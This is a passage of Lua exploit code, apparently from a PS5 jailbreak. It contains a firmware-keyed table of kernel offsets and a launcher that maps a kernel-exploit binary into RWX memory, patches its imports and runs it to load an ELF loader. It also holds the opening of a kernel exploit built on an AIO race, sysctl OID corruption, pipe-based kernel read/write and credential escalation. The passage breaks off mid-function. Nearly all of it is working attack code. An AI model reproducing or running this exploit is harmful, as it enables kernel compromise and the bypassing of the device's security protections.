                arg1Value = 0x03CE7F7C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03CE7F78, mib = {9, 7} },
        nodeMutex = 0x01A8FF48,
        rodataProbe = { rva = 0x01024D9F, text = "_aio_submit_cmd" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c38, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "8.60" }] = {
        kernelData = 0x00C70000,
        allproc = 0x034E5D50,
        rootvnode = 0x03D6B510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00A9E3D5, retLow16 = 0xE3D5 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x027913A8, kind = 0x027913BC, kindByte3 = 0x027913BF,
                arg1 = 0x027913C0, arg1Byte1 = 0x027913C1, arg1Value = 0x02791398,
                deadSink = 0x027913C8,
            },
            b = {
                base = 0x02791280, kind = 0x02791294, kindByte3 = 0x02791297,
                arg1 = 0x02791298, arg1Value = 0x027911B0, visible = 0x027912D0,
            },
            c = {
                base = 0x02AB3C88, kind = 0x02AB3C9C, arg1 = 0x02AB3CA0,
                arg1Value = 0x03CE7F7C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03CE7F78, mib = {9, 7} },
        nodeMutex = 0x01A8FF48,
        rodataProbe = { rva = 0x0102534F, text = "_aio_submit_cmd" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c38, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "9.00" }] = {
        kernelData = 0x00CA0000,
        allproc = 0x033F5D50,
        rootvnode = 0x03C7B510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00AC1451, retLow16 = 0x1451 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x02787AB8, kind = 0x02787ACC, kindByte3 = 0x02787ACF,
                arg1 = 0x02787AD0, arg1Byte1 = 0x02787AD1, arg1Value = 0x02787AA8,
                deadSink = 0x02787AD8,
            },
            b = {
                base = 0x02787990, kind = 0x027879A4, kindByte3 = 0x027879A7,
                arg1 = 0x027879A8, arg1Value = 0x027878C0, visible = 0x027879E0,
            },
            c = {
                base = 0x02AAA678, kind = 0x02AAA68C, arg1 = 0x02AAA690,
                arg1Value = 0x03BF8F3C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03BF8F38, mib = {9, 7} },
        nodeMutex = 0x01A588E8,
        rodataProbe = { rva = 0x0110791A, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c38, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "9.20" }] = {
        kernelData = 0x00CA0000,
        allproc = 0x033F5D50,
        rootvnode = 0x03C7B510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00AC1471, retLow16 = 0x1471 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x02787AB8, kind = 0x02787ACC, kindByte3 = 0x02787ACF,
                arg1 = 0x02787AD0, arg1Byte1 = 0x02787AD1, arg1Value = 0x02787AA8,
                deadSink = 0x02787AD8,
            },
            b = {
                base = 0x02787990, kind = 0x027879A4, kindByte3 = 0x027879A7,
                arg1 = 0x027879A8, arg1Value = 0x027878C0, visible = 0x027879E0,
            },
            c = {
                base = 0x02AAA678, kind = 0x02AAA68C, arg1 = 0x02AAA690,
                arg1Value = 0x03BF8F3C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03BF8F38, mib = {9, 7} },
        nodeMutex = 0x01A588E8,
        rodataProbe = { rva = 0x011077CF, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c38, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "9.40" }] = {
        kernelData = 0x00CA0000,
        allproc = 0x033F5D50,
        rootvnode = 0x03C7B510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00AC19E1, retLow16 = 0x19E1 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x02787AB8, kind = 0x02787ACC, kindByte3 = 0x02787ACF,
                arg1 = 0x02787AD0, arg1Byte1 = 0x02787AD1, arg1Value = 0x02787AA8,
                deadSink = 0x02787AD8,
            },
            b = {
                base = 0x02787990, kind = 0x027879A4, kindByte3 = 0x027879A7,
                arg1 = 0x027879A8, arg1Value = 0x027878C0, visible = 0x027879E0,
            },
            c = {
                base = 0x02AAA678, kind = 0x02AAA68C, arg1 = 0x02AAA690,
                arg1Value = 0x03BF8F3C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03BF8F38, mib = {9, 7} },
        nodeMutex = 0x01A588E8,
        rodataProbe = { rva = 0x0110790F, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c38, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "9.60" }] = {
        kernelData = 0x00CA0000,
        allproc = 0x033F5D50,
        rootvnode = 0x03C7B510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00AC1BC1, retLow16 = 0x1BC1 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x02787AB8, kind = 0x02787ACC, kindByte3 = 0x02787ACF,
                arg1 = 0x02787AD0, arg1Byte1 = 0x02787AD1, arg1Value = 0x02787AA8,
                deadSink = 0x02787AD8,
            },
            b = {
                base = 0x02787990, kind = 0x027879A4, kindByte3 = 0x027879A7,
                arg1 = 0x027879A8, arg1Value = 0x027878C0, visible = 0x027879E0,
            },
            c = {
                base = 0x02AAA678, kind = 0x02AAA68C, arg1 = 0x02AAA690,
                arg1Value = 0x03BF8F3C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03BF8F38, mib = {9, 7} },
        nodeMutex = 0x01A588E8,
        rodataProbe = { rva = 0x01107BFA, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c38, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },
}

function get_relapse_offset()
    for fw_list, offsets in pairs(relapse_offset_list) do
        for i, check_fw in ipairs(fw_list) do
            if check_fw == FW_VERSION then
                return offsets
            end
        end
    end
    return nil
end

-- =====================================================================
-- kexp.lua
-- =====================================================================
local kexp = (function()
-- kexp.lua
-- Kernel exploit shellcode launcher for ps5-kexp and elfldr

local KEXP_SIZE = 18912
local kexp_patch = {
    resolver_calls = { 0x1c, 0x23 },
    getpid_call_at = 0x10f1,
    getpid_tail_at = 0x10fb,
    getpid_tail = { 0x48, 0x89, 0x45, 0xd0, 0x31, 0xc0 },
    getpid_pad_from = 0x1101,
    getpid_pad_to = 0x1106,
    log_calls = { 0x126d, 0x12ad, 0x3bc2 },
    libkernel_imports = {
        { 0x48b0, "sceKernelSendNotificationRequest" },
        { 0x48b8, "sysctlbyname" },
        { 0x48c0, "pthread_create" },
        { 0x48c8, "pthread_join" },
    },
    libc_imports = {
        { 0x48d0, "malloc" },
        { 0x48d8, "free" },
        { 0x48e0, "memcpy" },
        { 0x48e8, "memset" },
        { 0x48f0, "strcmp" },
        { 0x48f8, "memcmp" },
        { 0x4900, "vsnprintf" },
    },
}

local function shared_key(name)
    -- shared/ is keyed by the binary type, so "kexp.bin" and "kexp-v0.8.bin"
    -- both resolve to the same prefetched bytes.
    if not (shared_bytes and shared_prefetch) then return nil end
    local lower = name:lower()
    if lower:find("kexp") then return "kexp" end
    if lower:find("elfldr") then return "elfldr" end
    return nil
end

local function find_payload_file(configured_name, fallback_name)
    local sdir = (get_savedata_path and get_savedata_path()) or "/savedata0/"
    if configured_name and not configured_name:find("@@") then
        local p = sdir .. configured_name
        if file_exists(p) then return p end
    end
    if fallback_name then
        local p = sdir .. fallback_name
        if file_exists(p) then return p end
    end
    if get_title_id then
        local title = get_title_id()
        for _, slot in ipairs({"000", "001", "002"}) do
            local base = string.format("/mnt/sandbox/%s_%s/savedata0/", title, slot)
            if configured_name and not configured_name:find("@@") and file_exists(base .. configured_name) then
                return base .. configured_name
            end
            if fallback_name and file_exists(base .. fallback_name) then
                return base .. fallback_name
            end
        end
    end
    -- Nothing in savedata: fall back to the loader's shared/ directory.
    local key = nil
    if configured_name and not configured_name:find("@@") then key = shared_key(configured_name) end
    if not key and fallback_name then key = shared_key(fallback_name) end
    if key then return "shared:" .. key end
    return nil
end

local function read_payload_file(path)
    if path:sub(1, 7) == "shared:" then
        local ok, data = pcall(shared_bytes, path:sub(8))
        if ok and data then return data end
        return nil
    end
    local f = io.open(path, "rb")
    if not f then return nil end
    local data = f:read("*all")
    f:close()
    return data
end

local function write_nop(addr, count)
    for i = 0, count - 1 do memory.write_byte(addr + i, 0x90) end
end

local function patch_imports(ctx, entry_addr, size)
    if size ~= KEXP_SIZE then
        -- ps5-kexp resolves its imports dynamically via dlsym
        return true
    end
    for _, offset in ipairs(kexp_patch.resolver_calls) do
        if memory.read_byte(entry_addr + offset):tonumber() ~= 0xe8 then
            return true
        end
    end

    for _, offset in ipairs(kexp_patch.resolver_calls) do
        write_nop(entry_addr + offset, 5)
    end

    local getpid_addr = dlsym(ctx.libkernel_handle, "getpid")
    memory.write_byte(entry_addr + kexp_patch.getpid_call_at, 0x48)
    memory.write_byte(entry_addr + kexp_patch.getpid_call_at + 1, 0xb8)
    memory.write_qword(entry_addr + kexp_patch.getpid_call_at + 2, getpid_addr)
    for i, byte in ipairs(kexp_patch.getpid_tail) do
        memory.write_byte(entry_addr + kexp_patch.getpid_tail_at + i - 1, byte)
    end
    write_nop(entry_addr + kexp_patch.getpid_pad_from, kexp_patch.getpid_pad_to - kexp_patch.getpid_pad_from)

    for _, entry in ipairs(kexp_patch.libkernel_imports) do
        memory.write_qword(entry_addr + entry[1], dlsym(ctx.libkernel_handle, entry[2]))
    end
    for _, entry in ipairs(kexp_patch.libc_imports) do
        memory.write_qword(entry_addr + entry[1], dlsym(ctx.libc_handle, entry[2]))
    end

    for _, offset in ipairs(kexp_patch.log_calls) do
        if memory.read_byte(entry_addr + offset):tonumber() == 0xe8 then
            write_nop(entry_addr + offset, 5)
        end
    end

    return true
end

local function launch(ctx)
    local function profile_start()
        if ctx.profile_start then return ctx.profile_start() end
        return nil, nil
    end
    local function profile_stop(name, start_sec, start_nsec)
        if ctx.profile_stop and start_sec ~= nil then
            ctx.profile_stop(name, start_sec, start_nsec)
        end
    end

    local profile_sec, profile_nsec = profile_start()
    ctx.restore_thread_attributes()
    profile_stop("shellcode_restore_thread_attrs", profile_sec, profile_nsec)

    if not ctx.kbase or not ctx.proc_fd_addr then
        ctx.report("Kernel", "kernel r/w is incomplete")
        return false
    end

    local allproc = ctx.kaddr(ctx.off.allproc)
    if bit32.band(allproc.h, 0xffff0000) ~= 0xffff0000 then
        ctx.report("Kernel", "invalid allproc address " .. ctx.hex(allproc))
        return false
    end

    profile_sec, profile_nsec = profile_start()
    local elfldr_path = find_payload_file("@@ELFLDR_FILE@@", "elfldr-ps5.elf")
    profile_stop("shellcode_find_elfldr", profile_sec, profile_nsec)
    if not elfldr_path then
        ctx.report("Kernel", "elfldr payload not found")
        return false
    end
    profile_sec, profile_nsec = profile_start()
    local elfldr_data = read_payload_file(elfldr_path)
    profile_stop("shellcode_read_elfldr", profile_sec, profile_nsec)
    if not elfldr_data then
        ctx.report("Kernel", elfldr_path .. " could not be read")
        return false
    end
    profile_sec, profile_nsec = profile_start()
    local elfldr_ptr = lua.resolve_value(elfldr_data)
    profile_stop("shellcode_resolve_elfldr", profile_sec, profile_nsec)

    profile_sec, profile_nsec = profile_start()
    local kexp_path = find_payload_file("@@KEXP_FILE@@", "kexp.bin")
    profile_stop("shellcode_find_kexp", profile_sec, profile_nsec)
    if not kexp_path then
        ctx.report("Kernel", "kexp binary not found")
        return false
    end
    profile_sec, profile_nsec = profile_start()
    local kexp_data = read_payload_file(kexp_path)
    profile_stop("shellcode_read_kexp", profile_sec, profile_nsec)
    if not kexp_data then
        ctx.report("Kernel", kexp_path .. " could not be read")
        return false
    end

    profile_sec, profile_nsec = profile_start()
    local kexp_aligned_size = align_to(#kexp_data, PAGE_SIZE)

    local exec_fd = syscall.jitshm_create(0, kexp_aligned_size, ctx.prot_rwx):tonumber()
    local entry_addr = syscall.mmap(0, kexp_aligned_size, ctx.prot_rwx, 0x1, exec_fd, 0)
    local kexp_addr = lua.resolve_value(kexp_data)

    if entry_addr:tonumber() == -1 or entry_addr:tonumber() == 0 then
        local alias_fd = syscall.jitshm_alias(exec_fd, 0x3):tonumber()
        local rw_addr = syscall.mmap(0, kexp_aligned_size, 0x3, 0x1, alias_fd, 0)
        memory.memcpy(rw_addr, kexp_addr, #kexp_data)
        entry_addr = syscall.mmap(0, kexp_aligned_size, ctx.prot_rwx, 0x1, exec_fd, 0)
    else
        memory.memcpy(entry_addr, kexp_addr, #kexp_data)
    end

    if not patch_imports(ctx, entry_addr, #kexp_data) then
        profile_stop("shellcode_map_copy_patch", profile_sec, profile_nsec)
        return false
    end
    profile_stop("shellcode_map_copy_patch", profile_sec, profile_nsec)

    profile_sec, profile_nsec = profile_start()
    local args = memory.alloc(0x40)
    for i = 0, 0x38, 8 do
        memory.write_qword(args + i, 0)
    end
    memory.write_dword(args + 0x00, ctx.master.read_fd)
    memory.write_dword(args + 0x04, ctx.master.write_fd)
    memory.write_dword(args + 0x08, ctx.victim.read_fd)
    memory.write_dword(args + 0x0c, ctx.victim.write_fd)
    memory.write_qword(args + 0x10, allproc)
    memory.write_qword(args + 0x18, elfldr_ptr)
    memory.write_qword(args + 0x20, #elfldr_data)

    local api_table = memory.alloc(12 * 8)
    for i = 0, 11 do
        memory.write_qword(api_table + i * 8, 0)
    end
    -- kexp v0.8 resolves its imports from this table. The .js kernel exploits build
    -- the same one from window.SYMBOLS; the bridge exposes those as libkernel_addrofs
    -- and libc_addrofs, so the Lua path gets the same addresses.
    memory.write_qword(api_table + 0 * 8, libkernel_addrofs.sceKernelSendNotificationRequest)
    memory.write_qword(api_table + 1 * 8, libkernel_addrofs.sysctlbyname)
    -- [2] pthread_create (unused), [3] pthread_join (unused)
    memory.write_qword(api_table + 4 * 8, libkernel_addrofs.getpid)
    memory.write_qword(api_table + 5 * 8, libc_addrofs.malloc)
    memory.write_qword(api_table + 6 * 8, libc_addrofs.free)
    memory.write_qword(api_table + 7 * 8, libc_addrofs.memcpy)
    memory.write_qword(api_table + 8 * 8, libc_addrofs.memset)
    memory.write_qword(api_table + 9 * 8, libc_addrofs.strcmp)
    memory.write_qword(api_table + 10 * 8, libc_addrofs.memcmp)
    memory.write_qword(api_table + 11 * 8, libc_addrofs.vsnprintf)

    -- KEXP_API_MAGIC 'KXP2', KEXP_API_COUNT 12, then the table pointer.
    memory.write_dword(args + 0x28, 0x4B585032)
    memory.write_dword(args + 0x2c, 12)
    memory.write_qword(args + 0x30, api_table)
    profile_stop("shellcode_args_api_setup", profile_sec, profile_nsec)

    profile_sec, profile_nsec = profile_start()
    local pthread_create = fcall(libkernel_addrofs.pthread_create_name_np)
    local pthread_join = fcall(libkernel_addrofs.pthread_join)
    profile_stop("shellcode_prepare_thread_calls", profile_sec, profile_nsec)

    local spawn_err
    run_with_coroutine(function()
        local thr_handle_addr = memory.alloc(8)
        local create_sec, create_nsec = profile_start()
        local created = pthread_create(thr_handle_addr, 0, entry_addr, args, "kexp"):tonumber()
        profile_stop("shellcode_thread_create", create_sec, create_nsec)
        if created ~= 0 then
            spawn_err = "pthread_create returned " .. ctx.hex(created)
            return
        end
        local thr_handle = memory.read_qword(thr_handle_addr)
        ctx.on_handoff()

        local result_addr = memory.alloc(8)
        local join_sec, join_nsec = profile_start()
        local joined = pthread_join(thr_handle, result_addr):tonumber()
        profile_stop("shellcode_thread_join", join_sec, join_nsec)
        if joined ~= 0 then
            spawn_err = "pthread_join returned " .. ctx.hex(joined)
            return
        end
        ctx.stage("kexp: elfldr returned " .. ctx.hex(memory.read_qword(result_addr)))
    end)

    if spawn_err then
        ctx.report("Kernel", spawn_err)
        return false
    end

    return true
end

local function bump_refcount(file_addr, kread32, kwrite32)
    local rv, count = kread32(file_addr + 0x28)
    return rv == 0 and kwrite32(file_addr + 0x28, count + 0x100) == 0
end

return {
    launch = launch,
    bump_refcount = bump_refcount,
}

end)()

-- =====================================================================
-- relapse.lua
-- =====================================================================
-- credits: maj0r, ntfargo, ufm42, sonic_iso, jordy, dr. yenyen, theflow, slidybat, flatz, cow, nhk, bollarz, sleirsgoevy, echostretch, earthonion
-- constants
local AF_UNIX = 1
local AF_ROUTE = 17
local SOCK_RAW = 3
local MSG_DONTWAIT = 0x80
local RLIMIT_NOFILE = 8
local CPU_LEVEL_WHICH = 3
local CPU_WHICH_TID = 1
local RTP_SET = 1
local PRI_REALTIME = 2
local PRI_NORMAL = 3
local AIO_CMD_READ = 1

local PROT_RWX = 0x7
local O_NONBLOCK_FLAG = 0x4
local F_SETFL = 4
local LIBC_HANDLE = 2

syscall.resolve({
    getpid = 0x14,
    recvfrom = 0x1D,
    ioctl = 0x36,
    munmap = 0x49,
    socketpair = 0x87,
    getrlimit = 0xC2,
    setrlimit = 0xC3,
    cpuset_getaffinity = 0x1E7,
    cpuset_setaffinity = 0x1E8,
    rtprio_thread = 0x1D2,
    mmap = 0x1DD,
    fcntl = 0x5C,
    jitshm_create = 0x215,
    jitshm_alias = 0x216,
    aio_multi_wait = 0x297,
    aio_multi_poll = 0x298,
    aio_multi_cancel = 0x29A,
    clock_gettime = 0xE8,
    aio_submit_cmd = 0x29D,
})

-- exploit state
local off
local kbase
local curproc
local ucred_addr
local proc_fd_addr
local master
local victim
local fds = {}
local window_high = 0xffffffff
local armed_groups = {}
local mib_a, mib_b, mib_c
local pipe_size
local saved_pipe_buffers
local pipes_disarmed = false
local aim_buffer
local drain_buffer
local crossed = false
local defused = false
local handed_off = false
local eboot_segments_ptr, eboot_orig_addr, eboot_orig_size
local worker_park
local pinned_core
local allowed_mask
local thread_attrs_restored = false
local scratch_states = memory.alloc(0x400)
local scratch_qword = memory.alloc(8)
local scratch_group = memory.alloc(0x60)

local fast_poll_profile = { scans = 0, calls = 0, ids = 0, rounds = 0, elapsed = 0, clock_errors = 0 }
local fast_poll_profile_timer = memory.alloc(16)
local fast_stage_profile = {}

local tuning = {
    waiters = 18,
    requests = 13,
    churnBefore = 32,
    churnAfter = 256,
    sprays = 64,
    workerBlockers = 24,
    waitTimeoutUs = 10000,
}

-- forward declarations
local report, sysint, to_int32, is_kernel_pointer, kaddr, concat_mib, clear_buffer
local pin_to_single_core, restore_thread_attributes
local do_sysctl, sysctl_read_int, sysctl_write_int, name_to_mib, oid_kind
local first_interface_address, leak_kernel_base
local raise_fd_limit, open_socket_pair, submit_blocked_read, park_aio_workers
local wait_for_pending_requests, claim_pending_requests
local build_waiter_nodes, remember_armed_group, run_reclaim_batch
local cancel_request, first_pending_request, reclaim_waiter_array, flip_oid_kind
local set_window_low, set_window_high, aim_window
local kread32, kwrite32, kread64, kwrite64
local prepare_high_writer, make_oid_writable, steer_oid_window
local test_kernel_read, test_kernel_write, arm_kernel_read_write
local read_kernel_pointer_slow, find_process, find_current_process
local find_pipe, locate_pipes, aim_victim
local kread_fast, kwrite_fast, read_kernel32, read_kernel64, write_kernel32, write_kernel64
local cross_pipes, escalate
local lookup_aio_group, defuse_aio_groups
local launch_shellcode
local restore_oids, restore_pipes, restore_eboot_segments, release_aio_workers, close_scratch_descriptors
local stop, rescue, run

-- helpers

-- keep the tag argument for existing callers.
report = function(tag, detail)
    print("[-] " .. (detail or tag))
end

local function stage(message) print("[*] " .. message) end
local function ok_msg(message) print("[+] " .. message) end

-- match the syscall api's signed 32-bit return value.
sysint = function(fn, ...)
    local ret = fn(...)
    local v = ret.l
    if v >= 0x80000000 then v = v - 0x100000000 end
    return v
end

local function fast_poll_now()
    if sysint(syscall.clock_gettime, 4, fast_poll_profile_timer) ~= 0 then
        return nil, nil
    end
    return memory.read_qword(fast_poll_profile_timer):tonumber(),
        memory.read_qword(fast_poll_profile_timer + 8):tonumber()
end

local function fast_stage_start()
    return fast_poll_now()
end

local function fast_stage_stop(name, start_sec, start_nsec)
    local end_sec, end_nsec = fast_poll_now()
    if not start_sec or not end_sec then
        fast_poll_profile.clock_errors = fast_poll_profile.clock_errors + 1
        return
    end
    local elapsed = (end_sec - start_sec) + (end_nsec - start_nsec) / 1000000000
    if elapsed >= 0 then fast_stage_profile[name] = (fast_stage_profile[name] or 0) + elapsed end
end

to_int32 = function(v)
    if v >= 0x80000000 then return v - 0x100000000 end
    return v
end

is_kernel_pointer = function(value)
    if not value then return false end
    local top16 = bit32.rshift(value.h, 16)
    local low_aligned = bit32.band(value.l, 7) == 0
    local all_ones = value.h == 0xffffffff and value.l == 0xffffffff
    return top16 == 0xffff and low_aligned and not all_ones
end

kaddr = function(rva)
    return kbase + rva
end

concat_mib = function(a, b)
    local r = {}
    for _, v in ipairs(a) do table.insert(r, v) end
    for _, v in ipairs(b) do table.insert(r, v) end
    return r
end

clear_buffer = function(addr, size)
    for i = 0, size - 1, 4 do
        memory.write_dword(addr + i, 0)
    end
end

-- thread affinity

pin_to_single_core = function()
    local current = memory.alloc(0x10)
    syscall.cpuset_getaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, current)
    local allowed = memory.read_dword(current):tonumber()
    allowed_mask = allowed

    local core = -1
    for c = 0, 15 do
        if bit32.band(allowed, bit32.lshift(1, c)) ~= 0 then
            core = c
            break
        end
    end
    if core < 0 then
        report("PIN", "no allowed core in mask 0x" .. string.format("%x", allowed))
        return
    end

    local mask = memory.alloc(0x10)
    memory.write_byte(mask + bit32.band(bit32.rshift(core, 3), 0xf), bit32.lshift(1, bit32.band(core, 7)))
    syscall.cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)

    local rtprio = memory.alloc(0x10)
    memory.write_byte(rtprio, PRI_REALTIME)
    syscall.rtprio_thread(RTP_SET, 0, rtprio)

    pinned_core = core
end

restore_thread_attributes = function()
    if thread_attrs_restored then return end

    local want = allowed_mask
    if not want or want == 0 then want = 0xea00 end

    local mask = memory.alloc(0x10)
    memory.write_byte(mask, bit32.band(want, 0xff))
    memory.write_byte(mask + 1, bit32.band(bit32.rshift(want, 8), 0xff))
    syscall.cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)

    local rtprio = memory.alloc(0x10)
    memory.write_byte(rtprio, PRI_NORMAL)
    syscall.rtprio_thread(RTP_SET, 0, rtprio)

    thread_attrs_restored = true
end

-- sysctl

-- reused scratch buffers: do_sysctl runs hundreds of times before fast r/w
-- exists, and mib arrays here never exceed a few ints.
local sysctl_mib_buf = memory.alloc(0x40)
local sysctl_len_buf = memory.alloc(8)
local sysctl_value_buf = memory.alloc(8)

do_sysctl = function(mib, old_ptr, old_len, new_ptr, new_len)
    for i, value in ipairs(mib) do
        memory.write_dword(sysctl_mib_buf + (i - 1) * 4, value)
    end
    memory.write_dword(sysctl_len_buf, old_len or 0)

    local rv = sysint(syscall.sysctl, sysctl_mib_buf, #mib, old_ptr, old_ptr and sysctl_len_buf or nil, new_ptr, new_len)
    local len = 0
    if old_ptr then
        len = memory.read_dword(sysctl_len_buf):tonumber()
    end
    return rv, len
end

sysctl_read_int = function(mib)
    local rv = do_sysctl(mib, sysctl_value_buf, 4, nil, 0)
    return rv, memory.read_dword(sysctl_value_buf):tonumber()
end

sysctl_write_int = function(mib, value)
    memory.write_dword(sysctl_value_buf, value)
    return do_sysctl(mib, nil, 0, sysctl_value_buf, 4)
end

name_to_mib = function(name)
    local name_buf = memory.alloc(#name + 1)
    memory.write_buffer(name_buf, name)
    local out = memory.alloc(0x60)
    local rv, len = do_sysctl({ 0, 3 }, out, 0x60, name_buf, #name)
    if rv ~= 0 then return nil end

    local mib = {}
    for i = 0, math.floor(len / 4) - 1 do
        table.insert(mib, memory.read_dword(out + i * 4):tonumber())
    end
    return mib
end

oid_kind = function(mib)
